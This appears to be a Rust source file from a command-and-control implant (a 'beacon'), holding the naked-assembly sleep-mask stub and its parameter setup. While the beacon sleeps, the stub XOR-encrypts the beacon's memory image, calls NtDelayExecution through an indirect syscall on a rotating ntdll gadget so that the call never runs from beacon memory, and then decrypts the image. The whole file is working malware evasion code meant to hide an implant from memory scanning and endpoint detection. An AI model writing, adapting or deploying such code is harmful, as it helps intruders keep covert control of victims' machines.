//! Encrypted sleep mask: the self-contained sleep stub (port of the
//! original project's sleepmask NASM blob, in Rust naked asm).
//!
//! While the beacon sleeps, its whole image is encrypted with a
//! byte-oriented xorshift64 keystream — except the stub's own window,
//! which must stay plaintext to decrypt on wake. The stub:
//!
//! 1. encrypts `[img_base, stub_start)` then `[stub_end, img_end)`;
//! 2. sleeps through `NtDelayExecution` via an indirect syscall on a
//!    Hell's Hall gadget (the `syscall` instruction never runs from beacon
//!    memory, and the gadget rotates per cycle — the caller refreshes the
//!    `gadget` field of the parameter block before every call);
//! 3. regenerates the keystream from the same seed and re-runs both
//!    ranges (XOR with the identical stream decrypts);
//! 4. returns; the beacon resumes with its image intact.
//!
//! Every address comes from the `SleepMaskParams` block (stack-resident,
//! never encrypted) — the asm contains no absolute references, keeping the
//! blob position-independent (the double-base CI proof enforces it).
//!
//! Same exposure window as the original: the VEH handler is inside the
//! encrypted ranges, so an exception on a foreign thread during the sleep
//! window would execute ciphertext — the hooks are armed only on the
//! beacon's own thread, which is inside the syscall for the whole window.

use core::arch::naked_asm;

use specter_core::sleepmask::SleepMaskParams;

/// The encrypted-sleep stub.
///
/// # Safety
///
/// The parameter block must be stack-resident (never encrypted) and fully
/// initialized: valid image bounds containing this stub, a resolved
/// NtDelayExecution SSN and a live gadget.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
    naked_asm!(
        // ---- prologue: save everything the stub uses -----------------
        "push rbx",
        "push rbp",
        "push rdi",
        "push rsi",
        "push r12",
        "push r13",
        "push r14",
        "push r15",
        "sub  rsp, 0x28", // shadow space + local interval
        "mov  r15, rcx",  // r15 = params (survives everything)
        // load the fields once
        "mov  rbx, [r15 + 0x00]", // img_base  -> cur
        "mov  rdi, [r15 + 0x08]", // img_end
        "mov  rsi, [r15 + 0x10]", // stub_start
        "mov  r12, [r15 + 0x18]", // stub_end
        "mov  eax, [r15 + 0x28]", // ssn (u32)
        "mov  r13, [r15 + 0x30]", // gadget
        "mov  r14, [r15 + 0x38]", // interval
        "mov  rax, [r15 + 0x20]", // keystream seed
        // ---- encrypt range 1: [img_base, stub_start) ----------------
        "1:",
        "cmp  rbx, rsi",
        "jae  2f",
        "xor  byte ptr [rbx], al",
        "inc  rbx",
        // keystream: xorshift64, one byte per step (same stream on decrypt)
        "mov  rdx, rax",
        "shl  rdx, 13",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shr  rdx, 7",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shl  rdx, 17",
        "xor  rax, rdx",
        "shr  rax, 8",
        "jmp  1b",
        // ---- encrypt range 2: [stub_end, img_end) --------------------
        "2:",
        "mov  rbx, r12",
        "3:",
        "cmp  rbx, rdi",
        "jae  4f",
        "xor  byte ptr [rbx], al",
        "inc  rbx",
        "mov  rdx, rax",
        "shl  rdx, 13",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shr  rdx, 7",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shl  rdx, 17",
        "xor  rax, rdx",
        "shr  rax, 8",
        "jmp  3b",
        // ---- sleep: NtDelayExecution(FALSE, &interval) ----------------
        "4:",
        "mov  [rsp], r14",        // local interval
        "xor  ecx, ecx",          // Alertable = FALSE
        "mov  rdx, rsp",          // &interval
        "mov  r10, rcx",          // syscall ABI: arg1 -> r10
        "mov  eax, [r15 + 0x28]", // SSN
        "mov  r11, r13",          // gadget: syscall; ret in ntdll
        "call r11",
        // ---- decrypt: regenerate the identical stream -----------------
        "mov  rax, [r15 + 0x20]", // same seed
        "mov  rbx, [r15 + 0x00]", // img_base
        "mov  rdi, [r15 + 0x08]", // img_end
        "mov  rsi, [r15 + 0x10]", // stub_start
        "mov  r12, [r15 + 0x18]", // stub_end
        "5:",
        "cmp  rbx, rsi",
        "jae  6f",
        "xor  byte ptr [rbx], al",
        "inc  rbx",
        "mov  rdx, rax",
        "shl  rdx, 13",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shr  rdx, 7",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shl  rdx, 17",
        "xor  rax, rdx",
        "shr  rax, 8",
        "jmp  5b",
        "6:",
        "mov  rbx, r12",
        "7:",
        "cmp  rbx, rdi",
        "jae  8f",
        "xor  byte ptr [rbx], al",
        "inc  rbx",
        "mov  rdx, rax",
        "shl  rdx, 13",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shr  rdx, 7",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shl  rdx, 17",
        "xor  rax, rdx",
        "shr  rax, 8",
        "jmp  7b",
        // ---- epilogue -------------------------------------------------
        "8:",
        "add  rsp, 0x28",
        "pop  r15",
        "pop  r14",
        "pop  r13",
        "pop  r12",
        "pop  rsi",
        "pop  rdi",
        "pop  rbp",
        "pop  rbx",
        "ret",
        // stub end marker: the mask keeps [stub_start, stub_end) plaintext;
        // discovered at bootstrap by a bounded scan for these 8 bytes.
        ".quad 0x00000000CAFEBABE",
    );
}

/// Compute the static parts of the parameter block at bootstrap: the stub's
/// own window and the image bounds. `None` disables the mask (the beacon
/// falls back to the plain indirect sleep).
///
/// # Safety
///
/// The stub must be part of the mapped, page-aligned beacon image (the
/// caller passes its own address as the hint).
pub unsafe fn build_params() -> Option<SleepMaskParams> {
    let stub_start = spt_sleepmask as *const () as usize;
    // The image base: walk pages down from the stub's own address.
    let img_base = specter_core::sleepmask::find_image_base(stub_start, 0x1000, 64)?;
    // The stub end: bounded scan for the marker after the code.
    let stub_end = specter_core::sleepmask::find_marker(
        stub_start,
        0x400,
        &specter_core::sleepmask::STUB_END_MAGIC,
    )?;
    // The image end: bounded scan for the SPT_END marker.
    let img_end_marker = specter_core::sleepmask::find_marker(
        img_base,
        0x20000,
        &specter_core::sleepmask::IMAGE_END_MAGIC,
    )?;
    let img_end = img_end_marker + 8;
    if img_end <= stub_end || stub_start < img_base || stub_end <= stub_start {
        return None; // inconsistent bounds: refuse to encrypt anything
    }
    Some(SleepMaskParams {
        img_base,
        img_end,
        stub_start,
        stub_end,
        seed: 0,
        ssn: 0,
        _pad: 0,
        gadget: 0,
        interval: 0,
    })
}
